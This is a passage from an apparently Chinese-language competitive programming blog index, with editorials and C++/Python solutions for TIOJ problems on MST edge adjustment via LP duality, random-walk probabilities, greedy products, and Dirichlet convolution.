0$，而我們最終所求的就是 $v_m$ 把 $x = n$ 代入之後的值，相當於想要求 $\\left( \\mathbf{A} _ m \\mathbf{A} _ {m-1} \\cdots \\mathbf{A} _ 1 \\right)(n)$。\n由於 $\\mathbf{A}$ 的度數很低（只有 1），可以套用類似的分治作法來做到 $\\mathcal{O}((M+Q)\\log^2(M+Q))$ 的時間，其中 $M = \\max(m_i)$。\n感性上除了矩陣應該還有其他種「上面可以放多項式，且可以快速合併又可以對多項式取模」的物件，不過目前沒有想到符合的例子跟題目。\nReference https://www.mathenachia.blog/yukicoder-2166-usereditorial/#toc11 https://maspypy.com/%E5%A4%9A%E9%A0%85%E5%BC%8F%E3%83%BB%E5%BD%A2%E5%BC%8F%E7%9A%84%E3%81%B9%E3%81%8D%E7%B4%9A%E6%95%B0-%E9%AB%98%E9%80%9F%E3%81%AB%E8%A8%88%E7%AE%97%E3%81%A7%E3%81%8D%E3%82%8B%E3%82%82%E3%81%AE#toc22 https://github.com/yosupo06/library-checker-problems/issues/1058 https://codeforces.com/blog/entry/138113 https://www.cnblogs.com/zkyJuruo/p/16995141.html ","permalink":"https://omeletwithoutegg.github.io/2025/01/09/multipoint-evaluation-of-prefix-products/","tags":["tutorial","math","fft","matrix"],"title":"Multipoint Evaluation of Prefix Products"},{"contents":"SpaceChem https://tioj.ck.tp.edu.tw/problems/1724\nDescription 差點看不懂的題敘。\n簡單來說，現在有一張 $N$ 點 $M$ 邊的圖 $G$，第 $i$ 條邊權重是 $C_i$，保證前 $N-1$ 條邊是一棵樹。你希望修改一些邊的權重，使得前 $N-1$ 條邊組成的樹恰好是修改後的圖的一個最小生成樹。第 $i$ 條邊修改成 $D_i$ 的代價是 $|C_i - D_i|$，請輸出最小的代價是多少。\n請注意可以修改樹邊也可以修改非樹邊。\n$N \\leq 100, M \\leq 10000$\nSolution 如果 $T \\subseteq G$ 是一個最小生成樹，則對於每一條不在 $T$ 上的邊 $e = (u, v)$，$e$ 的邊權必須大於等於任何 $\\textrm{path}_T(u, v)$ 的邊的邊權，其中 $\\textrm{path}_T(u, v)$ 是指 $T$ 上 $u$ 到 $v$ 的簡單路徑。不然的話，就可以把一個樹邊斷掉換成 $e$。不難證明滿足這個條件的話，$T$ 必定也會是一個最小生成樹。\n我們可以知道我們只會把樹邊改小、把非樹邊改大。對於一條非樹邊 $e_i = (u, v)$，假設他的權重被改成 $C_i + x_i$，而樹邊 $e_j$ 則改成 $C_j - y_j$，那麼前一段的條件就可以寫成 $C_i + x_i \\geq C_j - y_j$，改寫成線性規劃標準式的話就變成\n$$\n\\text{maximize } -\\left(\\sum x_i + \\sum y_i\\right)\n\\text{ s.t. }\n\\begin{cases}\nx_i \\geq 0 \\\\\ny_j \\geq 0 \\\\\n-x_i - y_j \\leq C_i - C_j, \\forall {j: e_j\\in\\textrm{path}_T(e_i)}\n\\end{cases}\n$$\n對偶之後變成\n$$\n\\text{minimize } \\sum (C_i - C_j) z_{ij}\n\\text{ s.t. }\n\\begin{cases}\nz_{ij} \\geq 0 \\\\\n\\sum _ {j: e_j\\in \\textrm{path} _ T(e_i)} -z_{ij} \\geq -1, \\forall i \\\\\n\\sum _ {i: e_j\\in \\textrm{path} _ T(e_i)} -z_{ij} \\geq -1, \\forall j \\\\\n\\end{cases}\n$$\n這個 $\\sum z_{ij} \\leq 1$ 的形式正好就是二分圖匹配的形式：$z_{ij}$ 表示選了 $(i,j)$ 這條邊，而 $i$ 和 $j$ 的限制分別表示左邊和右邊的頂點的所有鄰邊當中只能選一條。因此本題就歸約到一個二分圖最小權匹配問題，左右部的頂點分別代表非樹邊跟樹邊。\n直接建圖的話會有 $N+M$ 個頂點跟 $\\mathcal{O}(NM)$ 條邊，在上面跑一般的 min cost flow 的話，流量是 $\\mathcal{O}(N)$ 而每次最短路徑需要的時間理論上應該要是 $\\mathcal{O}(N^2M)$（$NM$ 條邊並且 bellman ford 要更新 $N$ 輪），總時間應該是 $\\mathcal{O}(N^3M)$，因此我認為這樣就過有點誇張。\n雖然本題測資直接建圖會過（或者應該說 min cost flow 就是 $\\mathcal{O}(會過)$），但我還是寫了倍增法優化建圖。基本上就是在建 flow model 的時候先蓋一個類似樹上倍增法的結構，然後每次一個非樹邊加邊到樹上所有路徑就可以用四個倍增的節點解決。這樣就只有 $\\mathcal{O}(M+N\\log N)$ 條邊了。可以證明 bellman ford 也至多只要更新 $\\mathcal{O}(N\\log N)$ 輪，所以複雜度就是妥妥的 $\\mathcal{O}(N \\cdot N\\log N \\cdot (M + N\\log N))$\u0026hellip; 代進去一點都不妥。反正就是過了。用 potential + dijkstra 的 演算法大概可以壓更好。\n一個值得注意的點是，我們推出來的式子是「最小權匹配」而不是「最小權完美匹配」，所以在用 min cost max flow 模板求解的時候要小心模板會盡量流滿而讓一些權重正的邊也被選上了。如果是直接建圖的話就直接把那些邊刪掉就好了，而優化建圖則是需要加一些邊或是把 min cost max flow 模板小修改一下來處理。\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 #pragma GCC optimize(\u0026#34;Ofast\u0026#34;) #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; #define all(x) begin(x), end(x) #ifdef local #define safe cerr \u0026lt;\u0026lt; __LINE__ \u0026lt;\u0026lt; \u0026#34; line \u0026#34; \u0026lt;\u0026lt; __LINE__ \u0026lt;\u0026lt; \u0026#34; safe\\n\u0026#34; #define debug(a...) debug_(#a, a) #define orange(a...) orange_(#a, a) template \u0026lt;typename ...T\u0026gt; void debug_(const char *s, T ...a) { cerr \u0026lt;\u0026lt; \u0026#34;\\e[1;32m(\u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34;) = (\u0026#34;; int cnt = sizeof...(T); (..., (cerr \u0026lt;\u0026lt; a \u0026lt;\u0026lt; (--cnt ? \u0026#34;, \u0026#34; : \u0026#34;)\\e[0m\\n\u0026#34;))); } template \u0026lt;typename I\u0026gt; void orange_(const char *s, I L, I R) { cerr \u0026lt;\u0026lt; \u0026#34;\\e[1;32m[ \u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34; ] = [ \u0026#34;; for (int f = 0; L != R; ++L) cerr \u0026lt;\u0026lt; (f++ ? \u0026#34;, \u0026#34; : \u0026#34;\u0026#34;) \u0026lt;\u0026lt; *L; cerr \u0026lt;\u0026lt; \u0026#34; ]\\e[0m\\n\u0026#34;; } #else #define safe ((void)0) #define debug(...) safe #define orange(...) safe #endif using lld = int64_t; template \u0026lt;typename F, typename C\u0026gt; class MCMF { static constexpr F INF_F = numeric_limits\u0026lt;F\u0026gt;::max(); static constexpr C INF_C = numeric_limits\u0026lt;C\u0026gt;::max(); struct E { int to, r; F f; C c; }; vector\u0026lt;vector\u0026lt;E\u0026gt;\u0026gt; g; vector\u0026lt;pair\u0026lt;int, int\u0026gt;\u0026gt; f; vector\u0026lt;int\u0026gt; inq; vector\u0026lt;F\u0026gt; up; vector\u0026lt;C\u0026gt; d; optional\u0026lt;pair\u0026lt;F, C\u0026gt;\u0026gt; step(int S, int T) { queue\u0026lt;int\u0026gt; q; for (q.push(S), d[S] = 0, up[S] = INF_F; not q.empty(); q.pop()) { int u = q.front(); inq[u] = false; if (up[u] == 0) continue; for (int i = 0; i \u0026lt; int(g[u].size()); ++i) { auto e = g[u][i]; int v = e.to; if (e.f \u0026lt;= 0 or d[v] \u0026lt;= d[u] + e.c) continue; d[v] = d[u] + e.c; f[v] = {u, i}; up[v] = min(up[u], e.f); if (not inq[v]) q.push(v); inq[v] = true; } } if (d[T] == INF_C) return nullopt; for (int i = T; i != S; i = f[i].first) { auto \u0026amp;eg = g[f[i].first][f[i].second]; eg.f -= up[T]; g[eg.to][eg.r].f += up[T]; } return pair{up[T], d[T]}; } public: MCMF(int n) : g(n),f(n),inq(n),up(n),d(n,INF_C) {} void add_edge(int s, int t, F c, C w) { g[s].emplace_back(t, int(g[t].size()), c, w); g[t].emplace_back(s, int(g[s].size()) - 1, 0, -w); } pair\u0026lt;F, C\u0026gt; solve(int a, int b) { F c = 0; C w = 0; while (auto r = step(a, b)) { c += r-\u0026gt;first, w += r-\u0026gt;first * r-\u0026gt;second; ranges::fill(inq, false); ranges::fill(d, INF_C); } return {c, w}; } }; signed main() { cin.tie(nullptr)-\u0026gt;sync_with_stdio(false); int N, M; cin \u0026gt;\u0026gt; N \u0026gt;\u0026gt; M; vector\u0026lt;int\u0026gt; c(M); vector\u0026lt;pair\u0026lt;int, int\u0026gt;\u0026gt; es; vector\u0026lt;vector\u0026lt;pair\u0026lt;int,int\u0026gt;\u0026gt;\u0026gt; g(N); for (int i = 0; i \u0026lt; M; i++) { int a, b; cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b; --a, --b; if (i \u0026lt; N - 1) { g[a].emplace_back(b, i); g[b].emplace_back(a, i); } es.emplace_back(a, b); cin \u0026gt;\u0026gt; c[i]; } vector\u0026lt;int\u0026gt; pa(N), pa_edge(N), dep(N); auto dfs = [\u0026amp;](auto \u0026amp;\u0026amp;self, int i, int p = -1) -\u0026gt; void { for (auto [j, id] : g[i]) if (j != p) { pa[j] = i; pa_edge[j] = id; dep[j] = dep[i] + 1; self(self, j, i); } }; pa[0] = 0; pa_edge[0] = -1; dfs(dfs, 0); constexpr int inf = 1e9; int tot = M; constexpr int LG = 15; vector\u0026lt;int\u0026gt; sparse_table[LG]; for (int l = 0; l \u0026lt; LG; l++) { sparse_table[l].resize(N); for (int i = 0; i \u0026lt; N; i++) { sparse_table[l][i] = tot++; } } auto anc = [\u0026amp;](int v, int step) { while (step--) { v = pa[v]; if (v == pa[v]) break; } return v; }; auto get_max = [\u0026amp;](int u, int v) { int res = -inf; while (u != v) { res = max(res, c[pa_edge[u]]); u = pa[u]; } return res; }; auto lca = [\u0026amp;](int a, int b) { while (a != b) { if (dep[a] \u0026lt; dep[b]) swap(a, b); a = pa[a]; } return a; }; const int S = tot, T = tot + 1; MCMF\u0026lt;int64_t, int64_t\u0026gt; flow(tot + 2); for (int i = 0; i \u0026lt; N; i++) if (pa_edge[i] != -1) flow.add_edge(pa_edge[i], sparse_table[0][i], inf, 0); for (int l = 0; l + 1 \u0026lt; LG; l++) { for (int i = 0; i \u0026lt; N; i++) { int j = anc(i, 1 \u0026lt;\u0026lt; l); flow.add_edge(sparse_table[l][i], sparse_table[l + 1][i], inf, 0); flow.add_edge(sparse_table[l][j], sparse_table[l + 1][i], inf, 0); } } for (int i = N - 1; i \u0026lt; M; i++) { auto [a, b] = es[i]; int l = lca(a, b); // int mx = max(get_max(a, l), get_max(b, l)); // if (mx \u0026lt;= c[i]) continue; for (int u : {a, b}) { if (u == l) continue; const int d = dep[u] - dep[l]; const int lg = __lg(d); const int v = anc(u, d - (1 \u0026lt;\u0026lt; lg)); debug(u+1, v+1, lg); // assert(anc(v, 1 \u0026lt;\u0026lt; lg) == l \u0026amp;\u0026amp; anc(v, (1 \u0026lt;\u0026lt; lg) - 1) != l); flow.add_edge(sparse_table[lg][u], i, inf, 0); flow.add_edge(sparse_table[lg][v], i, inf, 0); } } for (int i = 0; i \u0026lt; N - 1; i++) { flow.add_edge(S, i, 1, -c[i]); flow.add_edge(i, T, 1, c[i]); // not match anything } for (int i = N - 1; i \u0026lt; M; i++) flow.add_edge(i, T, 1, c[i]); auto [_, ans] = flow.solve(S, T); cout \u0026lt;\u0026lt; -ans \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; // C_i - x_i \u0026lt;= C_j + y_j // x_i \u0026gt;= 0 // y_j \u0026gt;= 0 // x_i + y_j \u0026gt;= C_i - C_j // minimize \\sum x_i + \\sum y_j // dual -\u0026gt; // minimize (C_j - C_i) e_{ij} // s.t. \\sum _ j e_{ij} \u0026lt;= 1, \\sum _ i e_{ij} \u0026lt;= 1 // e_{ij} \u0026gt;= 0 } 後記 改寫 /about 的時候有感於是去一連串刷了好幾題 TIOJ 的題目。各種焦慮加上冬天很寒冷的憂鬱，不過至少寫 TIOJ 跟寫題解帶給我還有活力的感覺。\n最近一個很煩的事情是藍芽耳機用一陣子就會莫名奇妙斷線連不回來，必須關機後再開機（對，不能 reboot）才能修好。懷疑是 kernel 的問題但怎麼樣都找不到哪裡有有用的錯誤訊息。不知道要不要改用 lts kernel。\n去玩了一下之前 steam 買的小遊戲們（例如 baba is you 或是 這個），但感覺自己沒有定力玩這些小遊戲太久。這是不是就是所謂的電子\u0026hellip;\n","permalink":"https://omeletwithoutegg.github.io/2024/12/18/TIOJ-1724/","tags":["TIOJ","matching","tree","linear-programming","dual","flow"],"title":"TIOJ 1724"},{"contents":"化學磁牛 https://tioj.ck.tp.edu.tw/problems/1829\nDescription 現在數線上 $K$ 的地方有隻磁牛，磁牛每秒有 $p = \\frac{A}{B}$ 往左移動，$1-p$ 的距離往右移動。當移動到 $0$ 或移動到 $N$ 就會停止移動，問最後停在 $N$ 的機率是多少？\n假設答案的最簡分數是 $\\frac{P}{Q}$，則你應該輸出 $P$ 除以 $M$ 的餘數和 $Q$ 除以 $M$ 的餘數共兩個數字，其中 $M = 10 ^ 8 + 7$。\n有 $T$ 筆測資，$T\\leq 10^ 4; K\u0026lt;N\\leq 10^ {19}; A, B\\leq 3\\times 10^ 9;\\gcd(A,B)=1$\nSolution 本題可以拆成兩個部份。第一部份是推出機率的式子，第二部份是按照式子求出最簡分數的分子分母。\n雖然我原本是用 martingale 推的，不過這裡就放一個比較直覺的版本。令 $f(i)$ 表示在位置 $i$ 開始走的時候，最終停在 $N$ 的機率。那麼有\n$$\n\\begin{cases}\nf(0) \u0026amp;= 0 \\\\\nf(N) \u0026amp;= 1 \\\\\nf(i) \u0026amp;= pf(i - 1) + (1 - p) f(i + 1), \\forall {0 \u0026lt; i \u0026lt; N}\n\\end{cases}\n$$\n將最後一行變形可得\n$$\np \\cdot \\left( f(i) - f(i - 1) \\right) = (1 - p)\\cdot \\left( f(i + 1) - f(i) \\right)\n$$\n不妨令 $r = p/(1 - p)$（$p=0,1$ 的情況都特判），$f(1) - f(0) = c$，那麼可以得到\n$$\nf(i) = c + rc + \\dots + r^{i-1}c = \\frac{r^{i}-1}{r-1} \\cdot c\n$$\n再由 $f(N)=1$ 可以得到 $f(K) = \\frac{r^K-1}{r^N-1}$。為了使用等比級數公式我們需要 $r\\neq 1$，因此 $r=1$ 的情形就另外再推一下（此時 $p=1/2$，$f(K) = K / N$）。\n接著是第二部份求出最簡分數。利用 $r = (A/B) / (1 - A/B) = A / (B - A)$ 把 $\\frac{r^K-1}{r^N-1}$ 化簡一下。令 $C = B - A$。\n$$\n\\frac{r^K-1}{r^N-1}\n= \\frac{(A / C) ^ K - 1}{(A / C) ^ N - 1}\n= \\frac{A^K C^{N-K} - C^N}{A^N - C^N}\n= \\frac{C^{N-K}(A^K - C^K)}{A^N - C^N}\n$$\n此時上下都是整數了，但有可能上下不互質而不是最簡分數。先假設 $A \u0026gt; C$，這樣上下至少都是正的。因為 $A \\perp B$，我們可以推出 $A \\perp C$ 以及 $C^{N-K} \\perp (A^N-C^N)$。\n所以分子跟分母的 gcd 就是 $\\gcd(A^K-C^K, A^N-C^N)$，但 $A, C$ 又互質，我們可以知道 $\\gcd(A^K-C^K, A^N-C^N) = A^{\\gcd(K,N)} - C^{\\gcd(K,N)}$。因此精確的最簡分數就是\n$$\n\\frac{C^{N-K}(A^K - C^K) / (A^g - C^g)}{(A^N - C^N) / (A^g - C^g)}\n$$\n其中 $g = \\gcd(K,N)$。這個式子在 $A \u0026lt; C$ 的時候因為正負號會抵銷也剛好是對的。\nedit: 原本我以為只要輸出分子是 $C^{N-K}(A^K - C^K) (A^g - C^g) ^ {-1} \\pmod M$、分母是 $(A^N - C^N)(A^g - C^g) ^ {-1} \\pmod M$ 就好了，但在寫完題解之後發現 $A^g - C^g$ 可能模 $M$ 之後是 $0$，這樣除以 $0$ 會壞掉（也就是說本題測資目前沒有卡這個 case）。不過，令 $K = qg$ 的話可以如下化簡\n$$\n\\frac{A^K - C^K}{A^g - C^g} = \\frac{(A^g)^{q} - (A^g)^{q}}{A^g - C^g}\n= (A^g)^0 (B^g)^{q-1} + (A^g)^1 (B^g)^{q-2} + \\cdots + (A^g)^{q-1}(B^g)^0\n$$\n然後 $u^0 v^{q-1} + u^1 v^{q-2} + \\cdots + u^{q-1} v^0$ 可以用分治求得。\n有關 $\\gcd(a^m - b^m, a^n - b^m) = a^g - b^g$ 的證明 其中 $\\gcd(a, b) = 1, \\gcd(m, n) = g$。\n從大家學過的 $(a - b) | (a^k - b^k)$ 可以知道 gcd 至少會是 $a^g - b^g$ 的倍數，但恰好是 $a^g - b^g$ 這件事在 AC 之前我是亂矇的。\n後來在 stackexchange 查到證明，我理解如下：\n假設 $n = qm + r, 0 \\leq r \u0026lt; m$。\n$$\n\\begin{align*}\na^n - b^n\n\u0026amp;= (a^{qm} - b^{qm}) \\cdot a^r + b^{qm} (a^r - b^r) \\\\\n\u0026amp;= (a^m - b^m) \\cdot ((a^m) ^ {0} (b^m)^{q-1} + (a^m) ^ {1} (b^m)^{q-2} + \\cdots + (a^m) ^ {q-1} (b^m)^{0}) \\cdot a^r +\nb^{qm}(a^{r} - b^{r})\n\\end{align*}\n$$\n又 $b^k$ 跟 $a^n-b^n$ 一定是互質的，因此 $\\gcd(a^n - b^n, a^m - b^m) = \\gcd(a^m - b^m, a^{r} - b^{r})$，按照輾轉相除法這樣下去就最終會抵達 $a^g - b^g$。\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; #define all(x) begin(x), end(x) #ifdef local #define safe cerr \u0026lt;\u0026lt; __LINE__ \u0026lt;\u0026lt; \u0026#34; line \u0026#34; \u0026lt;\u0026lt; __LINE__ \u0026lt;\u0026lt; \u0026#34; safe\\n\u0026#34; #define debug(a...) debug_(#a, a) #define orange(a...) orange_(#a, a) template \u0026lt;typename ...T\u0026gt; void debug_(const char *s, T ...a) { cerr \u0026lt;\u0026lt; \u0026#34;\\e[1;32m(\u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34;) = (\u0026#34;; int cnt = sizeof...(T); (..., (cerr \u0026lt;\u0026lt; a \u0026lt;\u0026lt; (--cnt ? \u0026#34;, \u0026#34; : \u0026#34;)\\e[0m\\n\u0026#34;))); } template \u0026lt;typename I\u0026gt; void orange_(const char *s, I L, I R) { cerr \u0026lt;\u0026lt; \u0026#34;\\e[1;32m[ \u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34; ] = [ \u0026#34;; for (int f = 0; L != R; ++L) cerr \u0026lt;\u0026lt; (f++ ? \u0026#34;, \u0026#34; : \u0026#34;\u0026#34;) \u0026lt;\u0026lt; *L; cerr \u0026lt;\u0026lt; \u0026#34; ]\\e[0m\\n\u0026#34;; } #else #define safe ((void)0) #define debug(...) safe #define orange(...) safe #endif using lld = int64_t; template \u0026lt;typename T, T MOD\u0026gt; class Modular { public: constexpr Modular() : v() {} template \u0026lt;typename U\u0026gt; Modular(const U \u0026amp;u) { v = static_cast\u0026lt;T\u0026gt;(0 \u0026lt;= u \u0026amp;\u0026amp; u \u0026lt; MOD ? u : (u%MOD+MOD)%MOD); } template \u0026lt;typename U\u0026gt; explicit operator U() const { return U(v); } T operator()() const { return v; } #define REFOP(type, expr...) Modular \u0026amp;operator type (const Modular \u0026amp;rhs) { return expr, *this; } REFOP(+=, v += rhs.v - MOD, v += MOD \u0026amp; (v \u0026gt;\u0026gt; width)) ; REFOP(-=, v -= rhs.v, v += MOD \u0026amp; (v \u0026gt;\u0026gt; width)) // fits for MOD^2 \u0026lt;= 9e18 REFOP(*=, v = static_cast\u0026lt;T\u0026gt;(1LL * v * rhs.v % MOD)) ; REFOP(/=, *this *= inverse(rhs.v)) #define VALOP(op) friend Modular operator op (Modular a, const Modular \u0026amp;b) { return a op##= b; } VALOP(+) ; VALOP(-) ; VALOP(*) ; VALOP(/) Modular operator-() const { return 0 - *this; } friend bool operator == (const Modular \u0026amp;lhs, const Modular \u0026amp;rhs) { return lhs.v == rhs.v; } friend bool operator != (const Modular \u0026amp;lhs, const Modular \u0026amp;rhs) { return lhs.v != rhs.v; } friend std::istream \u0026amp; operator\u0026gt;\u0026gt;(std::istream \u0026amp;I, Modular \u0026amp;m) { T x; I \u0026gt;\u0026gt; x, m = x; return I; } friend std::ostream \u0026amp; operator\u0026lt;\u0026lt;(std::ostream \u0026amp;O, const Modular \u0026amp;m) { return O \u0026lt;\u0026lt; m.v; } Modular inv() const { return inverse(v); } Modular qpow(uint64_t p) const { Modular r = 1, e = *this; while (p) { if (p \u0026amp; 1) r *= e; e *= e; p \u0026gt;\u0026gt;= 1; } return r; } private: constexpr static int width = sizeof(T) * 8 - 1; T v; static T inverse(T a) { // copy from tourist\u0026#39;s template T u = 0, v = 1, m = MOD; while (a != 0) { T t = m / a; m -= t * a; std::swap(a, m); u -= t * v; std::swap(u, v); } assert(m == 1); return u; } }; constexpr int mod = 100000007; using Mint = Modular\u0026lt;int, mod\u0026gt;; void solve() { uint64_t N, K; int64_t rawA, rawB; cin \u0026gt;\u0026gt; N \u0026gt;\u0026gt; K \u0026gt;\u0026gt; rawA \u0026gt;\u0026gt; rawB; debug(N, K, rawA, rawB); if (rawA == 0) { // p == 0 cout \u0026lt;\u0026lt; 0 \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; 1 \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; return; } if (rawA == rawB) { // p == 1 cout \u0026lt;\u0026lt; 1 \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; 1 \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; return; } if (rawA * 2 == rawB) { auto g = gcd(K, N); debug(K / g, N / g); cout \u0026lt;\u0026lt; Mint(K / g) \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; Mint(N / g) \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; return; } // start -- (N - K) -- middle -- (K) -- goal // R_t is martingale -\u0026gt; E[R_{t\u0026#39;} | information \u0026lt;= t \u0026lt;= t\u0026#39;] = R_t // E[R_{t+1}] = p * r^{x+1} + (1 - p) * r^{x-1} = r^x // (r^K - 1) * P(\\bar{X}_t = K) + (r^{K-N} - 1) * P(\\bar{X}_t = K-N) = 0 // p1 + p2 = 1 // Mint p = A / Mint(B); // Mint r = (1 - p) / p; // Mint ca = (r.qpow(K) - 1); // Mint cb = (1 - r.inv().qpow(N - K)); // debug(ca, cb, r); // auto ans = ca / (ca + cb); // cout \u0026lt;\u0026lt; ans * 63 \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; // p = A / B // r = (1 - A/B) / (A/B) = (B - A) / A // ca / (ca + cb) = (r^K-1) / (r^K-1 + 1-r^{K-N}) // = (r^K-1) / (r^K-r^{K-N}) // = (r^{K+N}-r^N) / (r^{K+N} - r^K) // = (C/A^{K+N}-C/A^N) / (C/A^{K+N} - C/A^K) // = (C^{K+N} - C^N A^K) / (C^{K+N} - C^K A^N) // C^N (C^K - A^K) // C^K (C^N - A^N) Mint C = rawB - rawA; Mint A = rawA; auto gnk = gcd(K, N); auto G = C.qpow(gnk) - A.qpow(gnk); auto p = C.qpow(N - K) * (C.qpow(K) - A.qpow(K)) / G; auto q = (C.qpow(N) - A.qpow(N)) / G; // auto p = C.qpow(N - K) * (C.qpow(K) - A.qpow(K)); // auto q = (C.qpow(N) - A.qpow(N)); cout \u0026lt;\u0026lt; p \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; q \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } signed main() { cin.tie(nullptr)-\u0026gt;sync_with_stdio(false); int T; cin \u0026gt;\u0026gt; T; while (T--) solve(); } ","permalink":"https://omeletwithoutegg.github.io/2024/12/18/TIOJ-1829/","tags":["TIOJ","math","number-theory","adhoc"],"title":"TIOJ 1829"},{"contents":"巨大密室問題 https://tioj.ck.tp.edu.tw/problems/1619\nDescription 有長度 $n$ 的 $P_i$ 和 $O_i$ 兩個正整數序列，請任意排列這兩個序列使得 $\\prod _ i (P_i + O_i)$ 盡量大。\n$n\\leq 20000, 1 \\leq P_i, O_i \\leq 1000$。保證答案至多是 $60000$ 位數。\nSolution 既然兩個序列都可以動不妨令 $P_i$ 是從小排到大的。那麼可以 greedy 的猜說 $O_i$ 從大排到小會是最佳解，sort 完乘起來就是答案。\n證明：\n$$\n(P_i + O_i) (P_j + O_j) - (P_i + O_j) (P_j + O_i)\n= P_i O_j + P_j O_i - P_i O_i - P_j O_j\n= (P_i - P_j) (O_j - O_i)\n$$\n如果沒有排好的話就必定存在 $i \u0026lt; j$ 使得 $O_i \u0026gt; O_j$，又 $P_i \\leq P_j$，所以交換之後乘積不會變小。\n然後接下來的問題是答案可能會很大，因為我很懶惰所以就用 python 直接過了。有一個優化可能是乘法不一定要照順序乘，可以用分治或是霍夫曼樹之類的方法讓大位數的乘法的次數減少。\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import sys sys.set_int_max_str_digits(60025) n = int(input()) # a = [1000 for _ in range(n)] # b = [1000 for _ in range(n)] a = sorted(map(int, input().split())) b = reversed(sorted(map(int, input().split()))) p = [ai + bi for ai, bi in zip(a, b)] prod = 1 for x in p: prod *= x print(prod) 請注意 set_int_max_str_digits，不加上這行的話遇到極限測資會 RE。可以自己隨便在本地生大測資，跳出來的 RE 訊息就會提示你要用這個函式。\n","permalink":"https://omeletwithoutegg.github.io/2024/12/18/TIOJ-1619/","tags":["TIOJ","greedy","math"],"title":"TIOJ 1619"},{"contents":"細菌 https://tioj.ck.tp.edu.tw/problems/2116\nDescription 科學家發現了一種神奇的細菌，他們的繁殖方式很奇怪。這個世界上目前有 $N$ 隻細菌，第 $i$ 隻細菌的體積是 $A_i$ 立方公分。每過一年，對於一隻體積為 $x$ 立方公分的細菌，假設 $x$ 的所有正因數分別是\n$$1=d_1\u0026lt;d_2\u0026lt;\u0026hellip;\u0026lt;d_k=x$$\n那這隻細菌會生出 $k-1$ 隻細菌，體積分別是 $d_1,d_2,\u0026hellip;,d_{k-1}$ 立方公分。\n科學家發現這種繁殖方式太快了，而且這種細菌是永生的，很快的地球會被這種細菌佔滿!請告訴科學家們，過$K$年後，細菌們的總體積是多少。由於總體積可能太大了，所以請輸出總體積除以 $10^ {9}+7$ 的餘數。\n$N \\leq 10^6, A_i \\leq 10^6, K \\leq 10^9$\nSolution 因為細菌之間互不干擾，不妨令 $f_t(x)$ 表示一個體積 $x$ 的細菌經過 $t$ 秒的分裂之後分裂出的所有細菌的體積總和是多少。那麼可以列出遞迴式\n$$\n\\begin{cases}\nf_t(x) \u0026amp;= \\sum _ {d | x} f_{t-1} (d) \u0026amp; \\text{ if } t \u0026gt; 0 \\\\\nf_0(x) \u0026amp;= x\n\\end{cases}\n$$\n最後的答案是 $\\sum _ i f_K(A_i)$。\n注意到 $f_0 = \\textrm{id}$，而且每次 $t$ 增加 $1$ 就相當於跟 $\\mathbb{1}: n\\mapsto 1$ 做一次 dirichlet 捲積，即 $f_t = f_{t-1} * \\mathbb{1}$。因此 $f_K = \\textrm{id} * \\mathbb{1}^K$，且因為 $\\textrm{id}, \\mathbb{1}$ 都是積性函數，$f_K$ 也是一個積性函數。\n因此，我們只需要計算出 $f_K$ 的質數冪次的值，就可以 $\\mathcal{O}(C)$ 推出所有 $x \\leq C$ 的 $f_K(x)$ 了。\n現在考慮計算 $f_K(1), f_K(p), f_K(p^2), f_K(p^3), \\dots$。因為 $\\mathrm{id}(p^k) = p^k$ 以及 $\\mathbb{1}(p^k) = 1$，這相當於計算\n$$\n(1 + px + p^2x^2 + p^3x^3 + \\cdots) (1 + x + x^2 + \\cdots) ^ K\n$$\n的前幾項。可以用快速冪計算，也可以直接利用 $( 1+x+x ^ 2+\\cdots ) ^ K = (1-x) ^ {-K} = \\sum _ i \\binom{i+K-1}{i} x ^ i$ 的性質算一次乘法計算。因為 degree 不大（小於 $\\log_2{10^6} \\approx 20$）所以基本上是寫 $\\mathcal{O}(d^2)$ 的多項式乘法。\n積性函數和積性函數的乘積是積性函數的證明 設 $f * g = h$，即 $h(n) = \\sum _ {d | n} f(d) g(\\frac{n}{d})$。\n引理：\n對於互質的兩數 $a, b$ 以及一個任意的函數 $s$，$\\sum _ {d | ab} s(d) = \\sum _ {x | a} \\sum _ {y | b} s(xy)$\n證明：令 $D_n 